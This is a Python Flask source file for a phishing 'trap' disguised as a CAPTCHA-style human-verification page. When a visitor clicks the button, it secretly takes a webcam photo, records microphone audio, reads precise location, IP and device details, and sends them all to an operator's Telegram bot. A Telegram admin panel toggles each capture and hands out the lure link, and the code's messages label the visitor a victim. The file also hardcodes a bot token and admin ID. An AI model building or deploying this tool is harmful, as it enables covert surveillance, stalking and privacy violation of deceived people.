import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (لا تلمسها) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# نظام الإعدادات المطور (تحكم كامل)
system_config = {
    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v16.0\n\nالرابط شغال والوضع لوز! 🚀",
    "trap_title": "تأكيد الأمان الموحد",
    "status": "ON",      # حالة السيرفر (ON/OFF)
    "audio": "ON",       # تسجيل الصوت
    "location": "ON",    # سحب الموقع
    "banned_ips": []     # قائمة المحظورين
}

# ==========================================
# --- الدوال الأساسية للنظام ---
# ==========================================
def tg_request(method, payload=None, files=None):
    try:
        if files:
            return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
        return requests.post(API_URL + method, json=payload, timeout=20).json()
    except Exception as e:
        print(f"Error in TG request: {e}")
        return None

# ==========================================
# --- واجهة الصيد (The Trap) ---
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
        .icon { font-size: 50px; margin-bottom: 20px; color: #f38020; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        <h2>تحقق بشري</h2>
        <p style="color: #bbb;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت للوصول إلى المحتوى</p>
        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const cfg = { audio: "{{ audio }}", loc: "{{ loc }}" };
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});

        async function startCapture() {
            const btn = document.getElementById('go');
            const st = document.getElementById('st');
            btn.style.display = 'none';
            st.innerText = "جاري تهيئة النظام...";

            try {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: cfg.audio === 'ON'});
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play();

                const b = await navigator.getBattery().catch(() => ({}));
                const info = `📜 **تقرير صيد (v16.0)**\n🌐 IP: \`${ipData.ip}\`\n🔋 الشحن: ${Math.round(b.level*100)}%\n📱 النظام: ${navigator.platform}`;
                await send(info, 'msg');

                if(cfg.loc === 'ON') {
                    navigator.geolocation.getCurrentPosition(p => {
                        send(`📍 موقع الضحية:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                    }, null, {enableHighAccuracy: true});
                }

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send(c.toDataURL('image/jpeg', 0.8), 'img');

                    if(cfg.audio === 'ON') {
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const reader = new FileReader();
                            reader.readAsDataURL(new Blob(chunks));
                            reader.onloadend = () => send(reader.result, 'aud');
                            st.innerText = "✅ تمت العملية!";
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), 5000);
                    }
                }, 3500);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip in system_config["banned_ips"]:
        return "ACCESS DENIED (BANNED)"
    if system_config["status"] == "OFF":
        return "SERVER UNDER MAINTENANCE"
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"], audio=system_config["audio"], loc=system_config["location"])

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    if t == 'msg': tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 صيد جديد"}, {'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 بصمة صوت"}, {'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update or "message" not in update and "callback_query" not in update: return "OK"

    # أوامر الأدمن
    if "message" in update:
        msg = update["message"]
        chat_id = str(msg["chat"]["id"])
        if chat_id == ADMIN_ID:
            text = msg.get("text", "")
            if text.startswith("/ban "):
                ip_to_ban = text.split(" ")[1]
                system_config["banned_ips"].append(ip_to_ban)
                tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر IP: `{ip_to_ban}`"})
            else:
                kb = {"inline_keyboard": [
                    [{"text": "🔗 الرابط", "callback_data": "gen_link"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}],
                    [{"text": "📊 الإحصائيات", "callback_data": "status"}]
                ]}
                tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": json.dumps(kb)})

    elif "callback_query" in update:
        query = update["callback_query"]; cid = str(query["message"]["chat"]["id"]); data = query["data"]
        if cid == ADMIN_ID:
            if data == "gen_link":
                tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابط الصيد:\n`{BASE_URL}`"})
            elif data == "settings":
                skb = {"inline_keyboard": [
                    [{"text": f"السيرفر: {system_config['status']}", "callback_data": "toggle_status"}],
                    [{"text": f"الموقع: {system_config['location']}", "callback_data": "toggle_loc"}],
                    [{"text": f"الصوت: {system_config['audio']}", "callback_data": "toggle_audio"}],
                    [{"text": "🔙 رجوع", "callback_data": "back"}]
                ]}
                tg_request("editMessageText", {"chat_id": cid, "message_id": query["message"]["message_id"], "text": "⚙️ **لوحة التحكم المتقدمة**", "reply_markup": json.dumps(skb), "parse_mode": "Markdown"})
            elif data.startswith("toggle_"):
                key = data.replace("toggle_", "")
                if key == "status": system_config["status"] = "OFF" if system_config["status"] == "ON" else "ON"
                if key == "loc": system_config["location"] = "OFF" if system_config["location"] == "ON" else "ON"
                if key == "audio": system_config["audio"] = "OFF" if system_config["audio"] == "ON" else "ON"
                # تحديث لوحة الإعدادات فوراً
                tg_request("answerCallbackQuery", {"callback_query_id": query["id"], "text": "تم التحديث!"})
                webhook() # إعادة استدعاء لعرض التحديث (تبسيطاً)
            elif data == "back":
                webhook() # العودة للقائمة الرئيسية

    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
